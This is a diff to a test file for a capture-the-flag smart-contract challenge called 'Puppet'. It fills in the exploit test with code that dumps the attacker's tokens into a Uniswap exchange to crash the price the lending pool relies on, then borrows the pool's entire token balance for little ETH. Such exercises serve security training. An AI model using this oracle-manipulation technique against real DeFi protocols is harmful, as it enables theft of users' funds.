@@ -99,14 +99,26 @@ describe('[Challenge] Puppet', function () {
         expect(
             await this.lendingPool.calculateDepositRequired(POOL_INITIAL_TOKEN_BALANCE)
         ).to.be.eq(POOL_INITIAL_TOKEN_BALANCE.mul('2'));
+
     });
 
     it('Exploit', async function () {
         /** CODE YOUR EXPLOIT HERE */
+        await this.token.connect(attacker).approve(this.uniswapExchange.address, ATTACKER_INITIAL_TOKEN_BALANCE);
+        await this.uniswapExchange.connect(attacker).tokenToEthSwapInput(
+            ATTACKER_INITIAL_TOKEN_BALANCE.sub(1),
+            1, 
+            9999999999,
+        );
+        const ethIn = await this.lendingPool.calculateDepositRequired(POOL_INITIAL_TOKEN_BALANCE);
+        await this.lendingPool.connect(attacker).borrow(POOL_INITIAL_TOKEN_BALANCE, { value: ethIn });
+
+
     });
 
     after(async function () {
         /** SUCCESS CONDITIONS */
+        
 
         // Attacker has taken all tokens from the pool        
         expect(
